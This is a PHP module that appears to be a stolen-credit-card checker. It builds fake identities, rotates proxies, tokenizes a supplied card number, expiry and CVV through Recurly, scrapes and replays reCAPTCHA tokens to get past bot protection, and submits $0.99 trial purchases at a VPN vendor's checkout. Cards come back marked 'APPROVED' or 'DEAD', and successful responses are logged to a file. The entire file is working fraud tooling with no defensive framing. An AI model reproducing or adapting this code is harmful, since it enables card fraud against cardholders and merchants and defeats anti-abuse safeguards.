<?php

$retry = 0;

$isRetry = False;

start:

if ($isRetry) {
	$retry++;

	$this->curlx->DeleteCookie();
}

if ($retry > 2) {
	if (empty($empty)) $empty = 'Maximum Retrys Reached';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "RETRY - $empty!"];

	goto end;
}

$isRetry = True;

$server = $this->proxy();

$fake = $this->tools->GetUser();

$cookie = uniqid();

$ua = $this->curlx->userAgent();

$data = 'first_name='.$fake->first.'&last_name='.$fake->first.'&token=&number='.$cc.'&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=en-US&browser[referrer_url]=https%3A%2F%2Fwww.purevpn.com%2Ftrial.php&browser[screen_height]=846&browser[screen_width]=412&browser[time_zone_offset]=300&browser[user_agent]='.urlencode($ua).'&month='.$mm.'&year='.$yyyy.'&cvv='.$cvv.'&version=4.22.8&key=ewr1-A8N2iyqti0J1ovGn9ayjzt&deviceId=E44aFsa3WbwOl32K&sessionId=IGcTB2UKlwV5sBJC&instanceId=HnZeaFICkXR460KK';

$r1 = $this->curlx->Post('https://api.recurly.com/js/v1/token', $data, null, $cookie, $server['proxy']);

if (!$r1->success) {
	$empty = ''.$r1->error.'! ('.intval($r1->errno).')';

	goto start;
}

$json_r1 = json_decode($r1->body);

if (isset($json_r1->error)) {
	$empty = $json_r1->error;

	goto start;
}

if (!isset($json_r1->id)) goto start;

$tok = $json_r1->id;

$headers = ['User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; DUB-LX1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.104 Mobile Safari/537.36'];

$r2 = $this->curlx->Get('https://www.google.com/recaptcha/api2/anchor?ar=1&k=6LeDfUUaAAAAAGheUCXALQfXOyUtHFxdw_941M8-&co=aHR0cHM6Ly93d3cucHVyZXZwbi5jb206NDQz&hl=en&v=gEr-ODersURoIfof1hiDm7R5&size=invisible&cb=64ukhp4ijh7n', $headers, $cookie, $server['proxy']);

if (!$r2->success) {
	$empty = ''.$r2->error.'! ('.intval($r2->errno).')';

	goto start;
}

$cap_v1 = $this->getstr($r2->body, 'value="', '"');

if (empty($cap_v1)) {
	$empty = 'Captcha First Token was Empty';

	goto start;
}

$data = 'v=gEr-ODersURoIfof1hiDm7R5&reason=q&c='.$cap_v1.'&k=6LeDfUUaAAAAAGheUCXALQfXOyUtHFxdw_941M8-&co=aHR0cHM6Ly93d3cucHVyZXZwbi5jb206NDQz&hl=en&size=invisible&chr=%5B4%2C19%2C37%5D&vh=992380009&bg=!REKgQkcKAAQeE4AJbQEHnAgCKOERW_hSAbRL6yMXNf2Cu7E2G3TgJy904indmN6TSQzr5Mq4Yrj8v1VhSP3K_L2GVqnf2RUo69UydeLeRhQ9VGQYx6tlvvd0c2uGYpprafHVKiBFXYspSk3TvnZyk9NGw0eHvWVGv6Am7R_XGzyMWi0zb1I-nYnIZ5Rnbs3aVQlFUGCNhCfof4LMbpxtNMccPBd2fPIjKdqSsnXPNiDNnCkhyZQ5eSSgM3V2vGvElVgD_4gK6qRScTx4-VNOIKlRcgc7m89bP56TZJkQzkbQoAilpZiKLBbmRmTp3q9qnGVrPPLaHxSa7joR-CV8q_-Q4fDSC7066udvmNG8amOFcB8arA11GcwnhKRh8RfIxbQ5qfRod1ZokLavufWXDmScc2fX1oEuyQM6cgLHEkQv_p8z8tlSYBaVCeEcY-_A99sEII8Noqr_NF7vBEcWIBeUGI7JMowmCFvur-9tSqK9W--d0PmE_YpMZ9EcX_Wrvmn8kuZOTTDgM7m3y6VYkHm8-Zjpa9F4IsNw3SYgh8PpT31RbHBZiUCyv5OcQzJq6H1dHkD0pcHlb5dJHdWSk7LZCcfBqUH1HrX7LTY2D2QQ91P8SvpFqG_LvkLZWAc1CjdmZ4DKnNvdL_X1_vSiO4xFKQlfHQTxgePlEzAymiBWklMsU93xa9g9euKM4ehe1egZ54iubZKNOjBGetMIzG_EfOVW0GM9ntypUMOTmtw-RTMpeCrf8ICnUyubqWFI5TrTwmyfJJgf10lDqeYGQXjx6tgtvVhMcx4kErpTffIi27syYqxneu-29ab28NtHr6N8G1jTxXIo-HTsFACJ6IL1CYSzYZYb_zWMFINwxcWJNIcFUler446FWZ2rbVppH-a_B8UpN0X2aTazdzNs-V7Do8VvGAD0d4xmnlG0pfUNDoxJ4nQ2wCmuHyjWYabKQQXhhc7nLmX_TDlxebw3jHvbQab1t_SdkupduhIk_8fpmQFtJbNGnoydrp_ab_gWNV9RqEz5-kW7czWbLORlNioVgXB99dAz0b3eNVWmWGk3ATsvcp6pO3nH8051wGIZT8bd1v5rBlizzvW3TFmmMv5LH71YzJRN27BDuCY4ee-m8FiHMVabouY3qyaZ-yH-j0bvvq9CQcAXFH2jrHLHY4Dyds2ZYqv5TBG5ZTW_9PtCEtFnBVFCZt1h9EYzlf_XOddLtDyH-J6vzqtmF36x50VislF8dvGyXSZ5DDhWSGBszm5k1shFCaTsMBOnNHikyAK2HORQY6l9kQvnmqT2OspLMHGJd4HoXI_7Y7QMRHh8tCiF2d5YVp0JXG8veFucmRJLSgKKdkzsL-S9UM6T3bXR1st8N4SIIu-uLihlaCli5Z9yJVZIz634QCn9-wbf5rUOmB8szUhWOnZy3M_Zhl8BDL09KFzhSFzuXivK0fzf6Vn9yFrOiBtWjSf1hVO0aDpQ2KUHiqZI1aB5Dsv1qxdeCwc6_FAyhgUc0Jg-RdAHAkD6Z9_v-kNYRoF6ZIuagGowIc4Yj8Iuu367g6-8s1zPEvk17XIVHj2FTwNeW9oNp4QLRelz1eNbnneE_cbetF6-P42HSAhF7eMUEM9exYVY2-XoStYsg8B2tvyuC99YcrtOabHLF2TYM73NRdG5cH-JAJOLzHJTfj5kcY6JK_a9nT2lumocYat84DetY1uau9pT73Pv7r3bTy9vtT7Dvy1tCGa9Yd6VWppIigQNfSlQXLlg3CvNZpMVGl-aLUcMzvEjnT9o1D4y-3cvLnn58jJPvz_wNSVSaoQ8RnkzqEprmC7pF_0YTMatjKX4_BIT7XYv7qgKFvZN7VzaYTef5sC9THbS01e2eMqnwXiP037b-_hN_FWiLGfGrI9TqIigE-1mzgF8Sj4bFfCbC7n4smMhtY1a5KEBIu9sUe13Z29SVFLpz29mtnc3XB5CdhNaRu4EqhlE-7cUztqzK3PDUEk4frJUechqbdhbvUBP3CW28vy1ZOmeZVH3RL2kLsYP5feQHnCrX_vMRUPgwSR_unzsAON7VOWvLvxZsHhDwisqpspD2nnjyupj-cHPfkUMWcucb6pkDUzd7fsoct4r-DJ1owBYElyQLrKhYoJM1EitbKdSMZawUqYuUsXVwREe8spjy_duf71LzJC7ZN7vJiPBQG4Rl-fmfGnlb38BMTpBZzK_qFaXCF_jyJ2Nh2cSFuw3-InquF4EntXgD1OKCyubpeHQlFpLlXbVjNIfZzkBBTsQkPf2IKbdK8-Hk2sJtsXjvS9xWkyFuuWaXzCHUc_WErVbKXfQJZ4BhxRYRHcAQX0joHC3vss-6C6horao7r48NQtGaiKSoHZYeIMATDjX6t9AfYSUqHV8C-mHtMnIu0Hh74BJC4jvGvXyo2j-ZNbuqEiWlPWOMPlN29GsxbPKyhKmkOIJ-Q4uwRr57oK4ARLjQJSis8upekHx-BRN2RQGoPr-n7B_3Tfc70ZW7uOzSvKQI5vRF0ciNVRwgZgnzm_p5KAARTPShUeVfikUpA6uCSiOwtrQFniBzX-p5S40KRYA3zCKSQcnOECsKKkI0Lr1R4CnjQ-ARjFTYFLeyEvAWSxCkUICcRQ8iFlcLPffVZSHuiiyZRcK756-47BsSSS9nebvf62xvs0rt_IaOhvvYIGuvbooBS5KX43J7MU3efb4jJGHjkCMr_K-aLbv0sSdq8QN6ArWIm2ZeyzmU_fEK9lZOCD_egpvKrEruLKaUg*';

$r3 = $this->curlx->Post('https://www.google.com/recaptcha/api2/reload?k=6LeDfUUaAAAAAGheUCXALQfXOyUtHFxdw_941M8-', $data, $headers, $cookie, $server['proxy']);

if (!$r3->success) {
	$empty = ''.$r3->error.'! ('.intval($r3->errno).')';

	goto start;
}

$cap_v2 = $this->getstr($r3->body, 'rresp","', '"');

if (empty($cap_v2)) {
	$empty = 'Captcha Second Token was Empty';

	goto start;
}

$data = [
	'plan_code' => '2322',
	'billing_cycle' => 'trial',
	'email' => $fake->email,
	'name' => $fake->first.' '.$fake->last,
	'password' => 'CBAzyx321',
	'recurly_token' => $tok,
	'selected_option' => '0',
	'coupon' => '',
	'fpdr' => '',
	'locale' => 'en',
	'payment_method' => 'stripe',
	'rule_id' => '29',
	'addons' => '',
	'addon_country' => '',
	'three_ds_token_id' => '',
	'captcha_v3_token' => $cap_v2,
	'captcha_v2_token' => '',
	'country' => 'US',
	'total_amount' => '0.99',
	'acquisition_channel' => 'website',
	'referrer' => '',
	'checkout_start_time' => ''.time().''.rand(100,999).'',
	'passwordless' => false
];

$r4 = $this->curlx->Post('https://www.purevpn.com/wp-json/recurly/v1/checkout', http_build_query($data), null, $cookie, $server['proxy']);

if (!$r4->success) {
	$empty = ''.$r4->error.'! ('.intval($r4->errno).')';

	goto start;
}

$json_r4 = json_decode($r4->body);

if ($json_r4->status) {
	file_put_contents('rry_r4_status.txt', $r4->body . PHP_EOL, FILE_APPEND);

	$status = ['emoji' => '✅', 'status' => 'APPROVED', 'msg' => "CVV CARD - Payment was Successful!"];
} else {
	$err = $json_r4->message ? $json_r4->message.'!'.($json_r4->error_code ? ' ('.$json_r4->error_code.')' : '') : 'Unknown Error!';

	$status = ['emoji' => '❌', 'status' => 'DECLINED', 'msg' => "DEAD - {$err}"];
}

end: